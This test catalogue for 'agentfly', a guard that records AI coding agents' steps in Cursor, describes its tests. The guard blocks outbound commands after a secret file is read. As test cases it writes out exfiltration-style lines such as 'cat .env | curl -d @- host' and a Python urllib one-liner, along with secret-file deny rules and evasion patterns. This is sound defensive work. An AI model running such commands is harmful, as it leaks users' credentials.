# Tests

Only tests that exist are listed here. Each card adds its own tests and the
lines for them (R0 and normalisation: V5). Card ids (V5b, F11) and D-numbers name
the maintainers' work items and decisions, which are kept outside this repo.
- `cat .env` marks the session; `curl https://x.com` afterwards is blocked.
- `curl` without a prior secret read is allowed.
- `.env.local` is sensitive; `.env.example` and `id_rsa.pub` are not.
- `grep KEY .env` and `source .env` mark the session.
- `cat .env | curl -d @- host` is blocked (marking happens before blocking).
- `curl localhost:8000/health` is allowed even after marking.
- `python3 -c "import urllib.request; urllib.request.urlopen('https://x.com')"`
  after marking is blocked (a one-liner mentioning http).
- A secret read in one session does not affect another session.
- Marks survive a server restart.
- Cleaner: `curl -H 'Authorization: Bearer abc' https://u:p@x.com/?t=1`
  is saved as `curl -H <arg> x.com`; `API_KEY=abc make` is saved as
  `API_KEY=<removed> make`; an unsplittable command is saved as
  `<program> <unparsed>`. No secret survives in any shape (attached short
  options, long options, URL credentials, env-prefix and `export`):
  `mysql -pX db` is saved as `mysql -p<arg> <arg>`, and a flag cluster keeps only
  its first letter (`ls -la` is `ls -l<arg>`). `tests/leak_cases.py` lists them.
- Whitelist: the app serves only the `(method, path)` pairs in `ROUTE_WHITELIST`
  (`tests/test_app.py`); HEAD on an API route is 405; `/docs`, `/redoc` and
  `/openapi.json` are 404.
- Paths: the first start moves `~/.config/flightrecorder` once (`tests/test_paths.py`);
  every test runs under a temporary HOME (`tests/conftest.py`).
- Hook client (`tests/test_hook_client.py`, `tests/client_harness.py`): fuzzed stdin
  (surrogates, non-UTF-8, 5000-digit numbers, deep nesting, random bytes) always gives
  one JSON object and exit 0; planted markers in content, edits, output, nested
  fields and `tool_input` never reach the log, stderr or the request body;
  `parent_tool_call_id` arrives; an unknown agent gets allow and a stderr warning.
- Offline guard (`tests/test_offline_guard.py`): with no recorder, a slow one, or
  401/403, outbound commands (bare and wrapped in `bash -c`, `env`, `sudo`), every
  one-liner and guard-path commands are denied with "agentfly start"; `ls`,
  `curl localhost:8000/health` and private addresses are allowed.
- Serve (`tests/test_serve_port.py`): a second `serve` on a busy port exits 1, the
  token is unchanged and the first recorder still blocks R1. Docs
  (`tests/test_install_docs.py`): `install.sh` creates no `~/.config/flightrecorder`;
  README and HOOKS.md name `/` as the trail.
- Docs commands (`tests/test_docs_commands.py`): each command in AGENTS.md "Commands" and in the
  README code blocks names files, `agentfly` subcommands and modules that exist. Two files load
  into every session (F17-fix1). **Size:** AGENTS.md is at most 14 000 bytes (bytes, not
  characters). **Imports:** AGENTS.md and CLAUDE.md hold no `@name` outside a code span or a
  fenced block, because Claude Code imports it; CLAUDE.md keeps its one `@AGENTS.md` line. The
  scan is one pass in the CommonMark way and errs toward failing. Claude Code's lexer (marked
  without GFM) reads an `@name` that starts a text token or follows space, reads inside a code
  span in a list item, and lets emphasis win over a span: so a span hides an `@name` only at its
  start (`@x`) or, with no emphasis delimiter around, after a nested backtick. HTML, a tab, front
  matter, a backtick run with no closer, and a heading, fence or definition inside a quote or
  list item are findings too (the case tables in the test hold the rules). A differential fuzz
  against Claude Code's own extractor and a CommonMark parser, run by hand and not kept in the
  repo, found no text left unreported. **Wheel:** every `uv tool install ... dist/` line in a
  root `*.md` and in `WHEEL_HINT` names `.python-version`'s Python (`--python 3.12`): uv picks its
  newest otherwise. **Events:** each "arrive twice" claim (AGENTS.md, README, SPEC, `install.sh`)
  names the five events `install.sh` writes into `.cursor/hooks.json`.
- Package: `tests/test_package.py` builds the wheel, installs it with `uv tool`
  under a temporary HOME and runs `agentfly serve` and `agentfly-hook`. From the wheel it also:
  checks and tests the default rules the wheel carries (`rules check` / `rules test` on that file);
  replays the demo with byte-identical answers (R1 comes from the file inside the wheel); lists
  `R0, R1, npm-publish-after-env` at `/api/rules` with no `rules_problem`; and shows that the
  wheel's RECORD lists `agentfly/rules/default.toml` with the hash `init -g` checks it against.
- Package, offline (`tests/test_package.py`, `test_a_uv_failure_skips_only_offline_and_off_ci`): a
  `uv` that fails with a network error skips the package tests when `CI` is unset and fails them
  when `CI` is set (any non-empty value); any other `uv` failure fails them either way. The test
  puts a fake `uv` in place of the real one, so it needs no build and no network.
- Graph API: `GET /api/steps` without token → 200; wrong Host → 403; after
  README → `.env` → curl ntfy, payload has sensitive `.env` and blocked R1;
  `?all=1` returns more than the default last 10; `GET /` serves the React
  page and its `/assets/` load; wrong Host on `/` (and `/v2`) → 403; `/` and its assets send
  `Cache-Control: no-cache`; `/v2/` (also `/v2`, `/v2/index.html`) answers 307 to
  `/` with the query kept; missing `ui/dist` logs a warning and does not
  prevent the app from importing.
- Normaliser and R0 (`tests/test_normalize.py`, `tests/cases.py`, `tests/test_r0.py`):
  wrappers, substitutions, heredocs and one-liners; guard paths and R0 commands denied
  unmarked, bare, wrapped and unparseable. Subagent mark (`tests/test_subagent_mark.py`):
  parent link in either order, restart, 30-minute workspace fallback.
- History (`tests/test_localstore.py`, `tests/test_sessions_api.py`, `tests/test_wipe.py`):
  `/api/sessions` after a replay and restart; only SPEC §4 columns; retention; `wipe` keeps
  marks and links; Neo4j off without `neo4j = true`; a session event still links a subagent.
- History marks (`tests/test_history_mark.py`, V6b): the marked flag and the marking step
  (`marked_order`) equal `/api/steps` for `cat .env`, a `.env` read, a lone Write and a read of
  `.env.example`; a Read+Write of `.env` with one id (and the id-less `afterFileEdit` that ends
  it) marks, also after a restart; a subagent, a parent marked through its subagent (links in
  either order, nested) and a chat in the 30-minute fallback are marked with no marking step
  (a fallback chat that marks itself after the window ended names that step, as `/api/steps`
  does), another workspace is not; a `history.db` from before V6b opens with every row, the same marked
  flags and the first read answering 200; a failed upgrade rolls back; a flagging failure changes
  no hook answer.
- Step merge (`tests/test_step_merge.py`, `tests/fixtures/v2c_capture.json`): a shell, read
  or MCP pair with one `tool_use_id` is one step on the page, in history and in Neo4j's
  queue; the id-less fallback (0.3 s joins; 6 s, another path or another chat do not; the
  33rd waiting Read drops the oldest); strictest gate verdict; `afterFileEdit` never raises
  it; hook answers byte-identical with and without the merge; the capture replays as five
  steps. `tests/test_memory.py` covers `replace`.
- Step fields and health (`tests/test_step_fields.py`, V8b): after the `examples/scenario.json` replay
  the blocked step has `rule_text` (R1's message) and `user_message` / `agent_message` equal to
  the deny answer's, and the allowed steps have none of the three; a warned step on a shell
  command (answer `ask`) carries the answer's messages, a warned step on another event has
  `rule_text` and no messages (its answer is a plain allow); a merged
  pair shows the messages of the half whose verdict it shows, the earlier half on a tie (R0 against
  R1, either order); `/health` sends `last_hook_at` (`null` after start, UTC ms, set by a request
  that passed the token check, not by a 401); `?all=1` sends `marked_order` as `?limit=1` does. The
  messages reach neither `history.db` nor Neo4j (`tests/test_localstore.py`, `tests/test_store.py`,
  marker strings), and the deny answer's bytes are pinned.
- Rules file (`tests/test_rulefile.py`, `tests/test_rules_load.py`, `tests/test_rules_cli.py`,
  `tests/test_rules_api.py`, V5b): R1's name lists answer as the old `is_sensitive` did over about
  6,000 generated names; every kind of fault is refused with a message naming the rule (and
  `tomllib` oddities such as deep nesting never crash); the recorder runs the default when the
  active file is missing or invalid and says why in `/health` (`rules_problem`, only then) and
  `GET /api/rules`; a damaged packaged default leaves only R0, does not stop `uninstall` from
  importing and stops the recorder from starting (with a refused active file too, and then the
  reason says the default is damaged, not in force); `rules check` / `rules test` exit 1 and name the
  rule. Tests never read the real rules file: the conftest redirects `rulefile.ACTIVE_RULES` and
  sets `rulefile.ACTIVE_OWNER_UID` to the test's own user (and the umask to 022), and
  `RECORDER_CODE` does both in a child recorder. A path pattern with a `*` or a `[...]` and no
  character a name must contain (`[!x]*`, `*[a-z]*`) is refused as matching every path. A
  floating pattern (V5b-fix2: a run of parts with `**` on both sides) in any rule's `path_except`
  (`.ssh/**`, `a/**/b`, `**/x/**`, in a `match` rule and in an `after_then`'s `after`) is refused
  with a message naming the rule; `~/.ssh/**` and a name load. `rules check` loads a file whose
  `path` holds a floating pattern and prints one `warn:` line for it, and one for a command list
  whose heaviest bucket weighs over 20, once per list per rule (eleven entries `cat a0 bJ` weigh
  22 and give a line, ten weigh 20 and give none; the packaged default has no lint at all)
  (`tests/test_rulefile.py`, `tests/test_rules_cli.py`).
- Trusted file (`tests/test_rules_trust.py`, V5b-fix): a link (also a dangling one), a file that is
  not the owner's, one group or others can write, a named pipe and a folder are each refused: the
  default runs and `/health`, `/api/rules`, `doctor`, `agentfly start` / `status` (as one line) and
  `rules check` / `rules test` with no FILE say why; the reason line is at most 400 characters and
  always ends with what runs instead; `rules check FILE` is a draft check unless FILE is the
  active file; a child recorder says it over HTTP; a fresh process shows the owner is root.
  V5b-fix2: `rulefile.trust_problem` is the recorder's trust test alone (the same open, the same
  wording for each kind above, no read, no descriptor left open; none for modes 0644, 0640, 0600
  and 0444); `rules check LINK` and `rules test LINK`, where LINK points at the active file, judge
  the active file and name its path, not the link (a group-writable one is refused as that);
  `rules check` calls the active path "the active file" given itself or through a link.
- R1 minimum (`tests/test_rules_minimum.py`, D27): the packaged default passes; about thirty
  weakened files (R1 missing, as a match, warn or highlight, `after` on one event, `then` with a
  condition, lists that miss names, exceptions for a literal name, a file type or a folder) are
  each valid TOML refused with an error that starts `rule R1`, by `rules check` (exit 1) and by the
  recorder (the default runs); `.env*` for `.env` and `.env.*`, extra names, no exceptions, a
  reworded message and extra rules load; another rule's error does not hide R1's (also one whose
  id starts like it, `R10` or `R1x`), a broken R1 is
  not also "missing" (also when the fault is in its `after`, its `then` or an inline test). The
  check does not read `default.toml`.
  V5b-fix2 (`tests/test_rules_minimum.py`, `tests/r1_grid.py`): the names are judged by the shape
  of R1's patterns, not on sample names. SPEC §5's six bullets are one table
  (`rulefile.SECRET_FAMILIES`, which `spec_secret` also reads and which answers as the old
  function did on the grid and 20,000 random names); `rulefile.covers` says a pattern covers a
  bullet when it has no `/`, `?` or `[`, at most one `*`, and is the bullet's one name or `P*Q`
  with P a prefix of its fixed start and Q a suffix of its fixed end (`.env`: no more than 4
  characters in all); exceptions are judged by their own shape, not by the coverage rule. The
  brief's three dodge files (a chain of `.env.[!s]*`, `credentials[!$ ]*`, `.env.` plus fifteen
  `?`) are each refused by `rules check` (exit 1) with `rule R1: ` and the bullet; `.env*`, `.*`,
  `*pem`, extra names and `~/.ssh/**` load. R1 with a floating folder pattern (`.ssh/**`,
  `a/**/b`, `**/x/**`) is refused naming R1 and the recorder runs the default, while
  `~/.aws/config`, `~/.aws/**` and `/etc/ssl/private/*` load; the packaged R1 never charges the
  meter. `tests/r1_grid.py` keeps the old sample grid (SPEC's names in the shapes a list gets
  wrong, in several places and as a shell word) as a second opinion: every accepted fixture
  leaves no grid name unmarked. The brute force (seed 27) draws a thousand R1 name lists from
  one covering shape per family, some swapped for one- or two-character edits of it or for a
  fixed near miss (`.env.?*`, `.env*.env`, `.en*nv`) and some such added; for each list the file
  accepts, every secret name built from a family's start, a middle of up to two characters and
  its end (and each exempt ending) is marked, read and shell; at least 100 lists are accepted
  and 100 refused (399 and 601 here).
- Cost (`tests/test_rules_cost.py`, V5b-fix, V5b-fix2): what is worked out about a word is worked
  out once (memo hit counts); the weights of `rulefile.pattern_work`; a file at the limit of each
  shape is accepted and one unit over is refused naming the heaviest rule; a command entry is
  looked up in a table made once per command. The work has two bounds, both counted, and each
  test fails if its bound is taken away. A pattern that does not float makes at most `MAX_WORK`
  times the command's distinct candidates (`rulefile.distinct_candidates`) pattern tests per hook,
  also at 60 folders deep and on a partly parsed command, and never charges the meter (eight
  shapes at the limit, among them anchored and tail-only slash patterns and the reviewer's two
  files; the shapes that float are listed apart and a test says they float). A floating pattern
  (the reviewer's block rule `d*/d*/d*/zN/**` five times is in `SHAPES`) stops at `FLOAT_STEPS`
  plus one block's walk: through `Recorder.run` the hook answers the limit deny, the real steps
  (`fnmatch.fnmatchcase` calls on the heavy parts plus the starts and bare `*` parts seen at
  `_tally`) number 45,004 here, and with `_charge` a no-op it answers allow after 306,000. A walk
  stops once it has spent what the meter had left when it began: one `.ssh/**` on a path 50,000
  folders deep ends at most one start's work below 0 (final audit A1).
  The price of a long compare and of a bare `*` is pinned. The whole hook (`apply_rules`, 300
  words, paths 20 folders deep, `=` and `@` in the words; also 198 rules whose command lists all
  name the program in the command) is under the client's own 0.5 s wait (`@wallclock`, best of
  three; well under it here, so a loaded machine passes). No other test bounds seconds.
- Matcher (`tests/test_rules_matcher.py`, `tests/glob_oracle.py`, V5b-fix2): a slash pattern is
  split at each `**` into a head, a tail and middle blocks, and only a pattern with a middle block
  floats (`rulefile.floating`); the old walk is kept in `tests/glob_oracle.py`, and the new
  matcher answers as it did on 20,000 seeded random patterns and paths (anchored or not, leading,
  trailing and inner `**`, `*`, `?`, classes) and, through `Pattern.matches`, on `~/`, `/`, `..`,
  `//` and mixed case (5,000 random compiled slash patterns too); a pattern that does not float
  makes at most one `fnmatch` compare a part at depths 4, 20 and 60, and a bare `*` none; the
  tail is checked before a middle block and the head before the tail; middle blocks keep their
  order and do not overlap; the home folder is looked up once for a clause.
- Meter and command index (`tests/test_rules_meter.py`, V5b-fix2): patterns that do not float
  never charge (a meter's budget is the same after a 300-word command under the default, the
  reviewer's two files and a 167-name list); a floating pattern charges `1 + n * m // 256` for an
  `fnmatch` compare (`DIV`), and 1 for a start and for a bare `*`; past the budget `WorkLimit` is
  raised and every later charge raises, and one walk stops at the budget however deep the path;
  with no meter nothing is charged; a partly parsed command
  is walked once per distinct candidate. The command index (a list is looked up by program, then
  by the entry's rarest extra word) answers as the old loop on 3,000 seeded cases; a command
  naming 200 listed programs makes at most 201 key look-ups; 198 rules of 200 `cat` entries on
  150 `cat zN y` check no entry; a simple command is read once for all clauses of a hook.
- Command lists count against the rules limit (`tests/test_rules_meter.py`,
  `tests/test_rules_limit.py`, `tests/test_rules_cli.py`; owner 2026-10-21): a bucket of the index
  is charged its weight (1 plus the words of each rest) before its first entry is read (ten
  one-word rests weigh 20, and a meter of 19 reads none), and key probes cost a step for four
  (8 probes charge 2; fewer than 4 make no charge, even on a spent meter). The bipartite shape
  (198 block rules, each a list `cat aI bJ`, I below 20, J below 10, on 13 `;`-joined
  `cat a0 .. a19 zK`) gives the limit deny, and the entry work counted at `_entry_follows` and
  `_key_lookups` is at most `FLOAT_STEPS` plus one bucket (with `_charge` a no-op more than
  `FLOAT_STEPS` entries are read); as warn it answers `ask` with the limit message, as highlight
  allow with the rules in `meter.unfinished`; R0 and R1 answer as usual with those 198 rules
  before R1. Real shapes are never charged (the default on `command(60)`; 198 times `cat wN` on
  150 `cat zN y`; 198 times `cat w a0..a199` on 100 `cat w x`; 20 block rules of 15 entries like
  `git push --force` on 75 `git push origin bK`), while 198 times `cat wN` on `command(60)` pays
  only its probes (198 times 50 steps) and finishes. `rules check` prints one line for a heavy
  list, none at weight 20 (see Rules file above).
  The program walk is charged too (V5d): a clause makes at most `min(listed programs, programs of
  the simple command)` look-ups in each distinct simple command of the line, worked out for the
  whole clause from a table made once a hook (`rulefile._program_sizes`) and charged before the
  clause is walked; `PROGRAM_LOOKUPS_FREE` (300, as many as a hook of 300 words can make) cost
  nothing for each clause (198 clauses can make 59,400 look-ups, about 130 ms, that the meter
  never sees; the real shapes below need it), so a clause that cheap answers on a spent meter, and
  each look-up past them costs
  `PROGRAM_LOOKUP_STEPS` (4; a look-up was measured at 2.2 us against 0.4 us a step). 300 charges
  nothing and 301 charges 4. The target line (1,000 `;`-joined `cat zK y` against 198 rules of 50
  `cat wN`) charges 2,800 a clause, so 16 clauses walk (16,000 `_program_hit` calls, 198,000 with
  `_charge` a no-op) and the 17th and every later one raise without walking; block gives the limit
  deny, warn `ask`, highlight allow, and the whole hook is under the client's wait
  (`@wallclock`; 70 ms of rules here against 190 to 360 before). 300 distinct one-word commands
  are a real shape and are never charged. `test_the_budgets_are_pinned` pins `FLOAT_STEPS`
  (45,000), `PROBES_PER_STEP`, `PROGRAM_LOOKUPS_FREE` and `PROGRAM_LOOKUP_STEPS` by value, because
  every other test reads them by name.
- Limit (`tests/test_rules_limit.py`, V5b-fix2): one hook shares one budget (`rules.one_hook()`
  reads `rulefile.FLOAT_STEPS` at each call); an unfinished block rule gives the `rules limit`
  deny, the limit message in both fields, unless R0 or R1 answers; R0's and R1's answers are the
  same at the limit, also with the heavy rule placed before R1, and R1's mark is still set. An
  unfinished warn on a shell command answers `ask` with the limit message, on any other event a
  plain allow whose step shows `rules limit`; an unfinished highlight is skipped; an unfinished
  trigger is recorded in no chat and no parent, and a restart judges the next command as if the
  hook had not happened; a fired block before an unfinished one wins and one after it does not.
  Outside a hook nothing is charged. A 167-name list on 300 words of 30-character names gets no
  limit deny. `/health` has `rules_limit` only after a hit (a fresh start has the three keys
  again); the line is cut to 400 characters with "and K more"; the log line names the chat and
  the rule ids and holds no command text (and at most 80 characters of the chat id); a merged
  pair with a limit half shows the limit rule; the limit message says `rules check` may name the
  heavy rules. A trigger a chat holds only through the workspace fallback is evaluated again by
  `mark`; a heavy command that leaves it unfinished and also performs the trigger action gets the
  limit deny and nothing is recorded for that chat (it fails closed).
- Long words (`tests/test_long_words.py`, V5b-fix2): a quoted word of 300 or 5,000 characters
  (with and without `/`), 128 emoji, a program name as long and a Read `file_path` with a part
  over the system's name limit each get the answer the short word gets, R1 still blocks after a
  `.env` read, and the step reaches the history cleaned; the cleaner asks the system about no
  word over 1,024 characters (not one call, also for a word inside the root as text); the root
  itself is `.`, and `ws2` beside `ws` is outside it; a
  lone surrogate or NUL makes a word not a path, an absolute path the system cannot encode (also
  one macOS resolves, U+DC80..U+DCFF) is saved as its base name, and a base name that does not
  encode is saved with U+FFFD for each lone surrogate, so a Read of `<ws>/x/\udcff` reaches the
  history and `/api/steps` answers 200; a 60 kB program word naming a secret is not looked up;
  a link loop never raises (shell word, Read and Write answer allow
  and reach the history); `bash -c` with 300 paths 60 deep is cleaned as one word and is under
  the client's wait (`@wallclock`). `tests/leak_cases.py` and `tests/test_clean.py` pass unedited.
- Path look-ups (`tests/test_path_lookups.py`, V5d): a command word is judged as text before the
  disk is asked: a relative word is joined to the root, `.` and `..` are folded, `~` is not
  expanded, and it is tried against the root as sent and as resolved. A word outside both (also
  `/net/x/...`) makes no `lstat`, `stat` or `readlink`, and the root is looked up once a hook; a
  link from outside that leads into the project counts as outside (`<arg>`). A word inside is
  walked by `clean.Lookups` with one `lstat` a part; a missing part ends the walk after that call,
  a link must lead inside, and 3,000 seeded random words over a tree of every kind of link (also
  the root as a link, and `//`) get the answer of `os.path.realpath(strict=True)`. All the words
  of a hook share `LOOKUP_STEPS` (4,000, pinned; a step for each `lstat` and `readlink`, measured
  4.6 us on a short path and 8.5 us at 753 characters, so the price is per call, and for each link
  followed a step and one more for each 64 characters of its target, whose parts are walked too: a
  link to `.` and 1,022 `/` crossed 31 times a word cost 553 ms for 300 words before the charge,
  21 ms after; more than 32 links make a word not a file; a root with `..` in it is not read by
  its text): a folder seen
  once is not looked up again (40 files in one folder cost three calls and 40), a word past the
  budget is saved as `<arg>` and is not the step's file, and the cleaner and the step record
  spend one budget (`build_step_record` makes one `Lookups` and splits the cleaned command once,
  at regular-expression speed: `cleaned_words` equals `names.words` on 5,000 random strings).
  An absolute program word is the step's file only if it is inside through the walk (an outside
  program such as `/bin/ls`, or one through a link that leads out, is not; a sensitive one is
  saved by its base name). Read and Write `file_path` keep `relative_file_path`. `@wallclock`:
  300 distinct words of 1,022 characters, 2- and 60-character folders, outside, inside and
  missing, inside and existing, answer within the client's wait through `apply_rules`.
- Shipped defaults (`tests/test_rules_shipped.py`, D28): `SHIPPED_DEFAULTS` ends with the hash of
  `default.toml`, has no duplicates, and equals the hashes of the earlier files kept in
  `tests/fixtures/shipped_defaults/` plus the current one; every earlier file still loads.
- Severities and triggers (`tests/test_severities.py`, `tests/test_after_then.py`,
  `tests/test_session_triggers.py`, `tests/test_npm_publish_entry.py`): the strictest rule wins in
  every file order; a warn on a shell command answers `ask` with the text in both messages, a warn
  elsewhere and every highlight answer `{"permission":"allow"}` (bytes pinned); the page and the
  history show warned and highlighted steps; a trigger survives a restart, reaches subagents and
  parents, is inherited for 30 minutes through the workspace fallback, never marks R1, and counts
  before the check on the same command; `npm publish` after `cat .env` is denied, in a fresh chat
  it is not.
- Install (`tests/test_install_*.py`): hooks.json splice keeps other tools' entries
  byte-identical (fuzzed), pinned Python checksum, the Cursor version list and how the
  version is read (D23, D32), install,
  repair and uninstall on a temporary root, the sudo command line. The rules file
  (`tests/test_install_rules.py`) is written when missing, mode 644, from the packaged default as
  read once, compared with the wheel's RECORD hash (the fake tool environment lists it) and parsed
  under the recorder's checks; an unedited earlier default (each fixture) is replaced and the
  message asks for a recorder restart; an edited file, valid or not, is kept with one notice line;
  a default changed after the check, one that does not parse or is weak, or one RECORD does not
  list stops the install before anything is written; a link or folder in its place is refused
  before any repair, and in the unprivileged run before the password (`tests/test_install_cli.py`);
  `uninstall` removes the file with the folder.
  V5e (D30, `tests/test_install_flow.py`): `uninstall` first copies an edited file (0644, 0600, any
  owner) to `rules.toml.<stamp>` in the backups folder with the same bytes, says where, and two
  rounds leave two copies (one stamp: `-1`); every copy is 0600, whatever the original's mode (the
  agent's user reads none), and is written as the system user's. This version's default (any mode), each older shipped default and
  no file are not copied and say nothing. A backups path that is a link or a file, or a failed
  write, stops it with the hook entries, the folder and the file unchanged (nothing written through
  the link), and the run after the fix leaves one copy. A link (also to a 0600 file), a folder, a
  named pipe (no hang) and a file over `MAX_FILE_BYTES` are named in one line and not copied (a
  folder, link or pipe also when swapped in after the first look: the open and its `fstat` stop
  it); a file of exactly the limit is copied; one root cannot read stops it. `init -g`
  (`tests/test_install_rules.py`, `tests/test_install_cli.py`) over a file of the system user that
  nobody else can write and the recorder's user cannot read (`installer.unreadable_notice`, by owner
  and mode: 0600, or 0640 in a group the user is not in; `rules_state` `unreadable` for the
  unprivileged run, which `status` does not count) prints the pinned line and "the recorder
  cannot read the rules file ...; to use it, run `sudo chmod 644 ...`", never "kept", changes
  nothing, and as the user asks for no password; with a repair or an upgrade pending, over an edit,
  this version's default or an older one, both runs stop with that line before anything changes
  (no file-system call) and before the password or the confirm question, while the default at 0600
  with nothing else to do is still rewritten. Another user's or a group-writable file is not this
  case (its notice stays; another user's unreadable file still asks for the password), and at 0644
  the edit is "kept" with no password. Each such run that exits 0 prints the newer-Cursor warning
  once, one that exits 1 prints none. `uninstall` that cannot write the copy exits 1 in one line.
  V5b-fix2 (`tests/test_install_rules.py`, `tests/test_install_cli.py`,
  `tests/test_rules_trust.py`): the principle is that `init -g` writes only bytes it has checked
  and never changes the trust of bytes it has not. Current bytes in a file that is not exactly
  a regular file of the layout's owner at mode 0644 (`rules_state` `untrusted`: another owner,
  mode 0664, mode 0600) are rewritten, the message names the reason and asks for a recorder
  restart, and `status` counts it as work; this is stricter than the recorder, which loads a
  root:admin 0640 file, so `doctor` may call fine a file `init -g` rewrites. A file an
  unprivileged run cannot read is `unknown`, not `edited`, and root decides after the password
  (since V5e, one of the system user's that the recorder cannot read either is `unreadable`).
  An edited file is never written, chowned or chmodded: a trusted one gets the existing notice,
  an untrusted one "kept your edited rules file ..., but the recorder will not read it: <reason>;
  <what runs instead>", the reason being the recorder's own wording (`rulefile.trust_problem`).
  An intact re-run prints the pinned "already installed and intact; nothing changed" and then
  the notice, as the user with no password; with other repair work a group-writable edit stops
  the repair (`assert_locked` fails closed) and the file is not touched. The lock check asks that
  the user can read `rules.toml`, not that others can (V5d, `tests/test_install_rules.py`): a
  root-owned 0640 edit in a group the user is in passes (`installer.Reader`: the user's id and
  groups, which as root are the `SUDO_UID`/`SUDO_GID` user's from `getgrouplist`; root itself
  counts only through the others' bit), also the repair that goes on past it and leaves it as it
  was; 0640 in a group the user is not in, 0660 and 0000 are refused, and every other file in the
  folder must still be readable by others. As the user, `init -g`
  checks the packaged default before the password when it would write one (a damaged one stops
  with no prompt, and an edited file that means none is written does not need it); a refresh of
  the rules alone asks for a recorder restart and not a Cursor restart, one that changes more
  still asks for both.
- Escaped names (`tests/test_install_packages.py`, `tests/test_install_cli.py`,
  `tests/test_doctor.py`, F13): every text the package check shows the owner (the refusal, the
  confirm question, `doctor`'s package line, `tool_environment`'s messages) writes each character
  `str.isprintable` calls false as an escape (`\x1b`, `\n`, `\u202e`; `packages.visible`) and
  leaves other text alone, `café.py` and a backslash included. `inspect` escapes `Check.problems`
  and `Check.changes` when it builds them and `confirm` escapes what it prints; the hash record
  keeps names as read. Tests plant a name holding `ESC [2K`, a newline and U+202E in an unlisted
  file, a listed file that fails its hash or cannot be read, a RECORD row outside the
  environment, a dist-info folder and the environment path, and each of them in a `METADATA` Name
  or Version (a newline there is a folded header: a plain one ends it); `init -g` and `uninstall`
  stop with one printable line and no password, nothing raw reaches stdout before "Go on? [y/N]",
  `doctor` prints one plain line. Expected texts are written out, never computed with `visible`.
- Cursor versions (`tests/test_install_cursor.py`, `tests/test_install_cli.py`, `tests/test_doctor.py`,
  V3d, V3d-fix1, V3d-fix2, D32): a version newer than the newest listed one, part by part as numbers, gets
  the newest's events and one `warning:` line naming both versions with the restart-and-`doctor`
  advice, once however `init -g` ends (the user's run elevates, finds the install intact, or the
  sudo is typed by hand); the record keeps the real version, and `doctor` after `init -g` shows it.
  A listed version prints exactly the lines e6e6894 printed, written out in the test. Older,
  in-between, non-dotted, 10,000-character and control-character versions are refused in one
  escaped line with nothing written (a newline, `&#13;`, U+009B and U+202E print escaped). The
  `Info.plist` is read as XML only, at most 1 MiB, from a plain file: a binary plist (one built from
  300 object numbers that point at one blob takes 299 MiB in plistlib; reading it peaks under
  64 MiB, as 1 MiB of empty or nested XML does), a pipe, a folder (no descriptor left open), a
  larger file and a malformed one (one row per exception plistlib can raise) are one refusal. So
  is a header with more than Cursor's (V3d-fix2): only an XML declaration and then at most
  `<!DOCTYPE plist PUBLIC "..." "...">` may come before `<plist>`. Headers that hold an ATTLIST
  subset (a 10,000-character default for each of 10,000 empty elements: 70 KB, 0.6 s of CPU, the
  input checked by what expat hands the handler), the same behind a comment holding
  `<!DOCTYPE plist>` or `<plist`, or behind a SYSTEM or PUBLIC ID holding `>`, with no declaration,
  an entity, a comment, a processing instruction, a second DOCTYPE, a SYSTEM ID, single quotes: each
  is refused with the parser never called (the calls are counted), by `init -g` in one line before
  the password, and leaves the version unread in `doctor`. A generated mix of header pieces shows
  that nothing the check accepts declares anything to expat; Cursor's real header is accepted
  with or without a BOM and with LF or CRLF; a megabyte of hostile header is checked in a child
  process with a kill timeout.
- Service (`tests/test_service.py`, stubs in `tests/launchctl_stub.py`, `tests/brew_stub.py`,
  `tests/service_helpers.py`): `start` writes the KeepAlive plist and loads it, does nothing when
  it runs, reloads a changed file, waits for launchd's teardown; `stop` leaves no job and no file;
  a Homebrew keg with a stub `brew` runs `brew services`, writes no LaunchAgent and removes the
  one an earlier install left; `uninstall` removes the service and, when its system part fails,
  says only that and leaves the service alone (`tests/test_install_cli.py`). An autouse fixture
  in `tests/conftest.py` gives every test a stub `launchctl` and a closed health port, so no test
  reaches the real launchd or port 8787. The service labels are guard paths for R0 and the
  offline guard (`tests/cases.py`), and `_R0_PATHS` must equal `_GUARD_PATHS`
  (`tests/test_r0.py`).
- Hand-typed sudo (`tests/test_install_cli.py`): `sudo agentfly uninstall` typed by hand removes the
  system part, leaves the service running, prints the restart hint once, and says the service was
  not touched and that `agentfly uninstall` without `sudo` removes it, which it then does. The root
  child the user's `uninstall` starts through sudo is told from it by how Python started, not by
  its arguments (`-I -S`: `sys.flags.isolated` and `no_site` both set), and the flags
  `elevate.sudo_command` passes are the ones that check looks for.
- Doctor (`tests/test_doctor.py`): a clean install is all ok; each listed fault turns only its
  own line to fail; a warning alone exits 0; `path` compares environments (two venvs on one base
  Python are two programs), and a loaded LaunchAgent next to Homebrew's job fails `service`; the
  Hooks log is matched on the lines Cursor 3.25.9 wrote (the wording of an error about the system
  file itself has not been seen), each line in time linear in its length (a 200 KB line of blanks
  is matched in a child process with a kill timeout, which imports the tree under test and fails
  if it got another `agentfly`, judged by path components so that a sibling folder named like the
  tree's is another one, V3d-fix3, tested in `test_install_cursor.py` by
  `test_the_child_fails_if_it_imports_an_agentfly_from_a_folder_next_to_the_tree`; the old
  patterns took minutes), and read
  within bounds: at most 64 logs and none beyond (the reads are counted), only plain files (a pipe,
  a link to a pipe, a link to `/dev/zero` and a folder are skipped; the hang tests bound only the
  call that could hang), at most the last 4 MiB of each, each reduced to a verdict before the next
  is read (a `Loaded` line can hold a million steps), and the folders walked through what was
  opened, without following a link (70 links to one window are one window): the start folder, the
  windows or the outputs (the only one of them as well) are swapped, between listing and opening,
  for links to one shared folder or for named pipes (made to happen in the test, for a listed and
  a newer version), and the opens are counted: none twice, none through a link, none by name, no
  more than folders existed, none listed twice, no descriptor left open. One real folder renamed
  onto each of 20 window names is listed once, and the walk stops at the 65th log. A line of the
  log is shown whole up to 1,000 characters, cut with "..." beyond, and always escaped (a short
  line with an ESC too); the Cursor version is shown cut and escaped. On a Cursor version that is
  not on the list (newer, refused, an unreadable one) a log that says nothing fails with the advice, a log that rejects the hooks
  fails, and one that loaded them is ok; on a listed version (both of them) the texts are those of
  e6e6894 and "nothing" is a warning. When the version cannot be read (V3d-fix3: a missing file, a
  pipe, a folder, over 1 MiB, a binary plist, UTF-16 with and without a byte-order mark, another
  header, a malformed file, an encoding Python does not know, no version in it, a version that is
  not a string) the `events` line, and the `hooks-log` line when the log cannot confirm the hooks,
  hold the cause `init -g` prints after `agentfly init: `: written out for each case with the
  plist's path, and compared with `init -g`'s own stderr; levels and exit code are as before; a
  path holding an ESC and a newline is shown escaped on one line and a 200-character path whole.
  Plists that declare ISO-8859-1 or cp1252 (with a letter that is not valid UTF-8) are read in it.
